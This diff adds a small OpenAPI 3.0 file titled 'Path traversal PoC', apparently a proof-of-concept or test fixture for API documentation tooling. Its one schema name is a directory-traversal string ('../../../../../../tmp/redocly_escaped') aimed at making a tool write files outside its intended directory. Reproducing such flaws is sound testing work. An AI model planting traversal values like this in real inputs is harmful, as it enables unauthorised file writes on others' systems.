@@ -1,0 +1,10 @@
+{
+  "openapi": "3.0.0",
+  "info": { "title": "Path traversal PoC", "version": "1.0.0" },
+  "paths": {},
+  "components": {
+    "schemas": {
+      "../../../../../../tmp/redocly_escaped": { "type": "object" }
+    }
+  }
+}
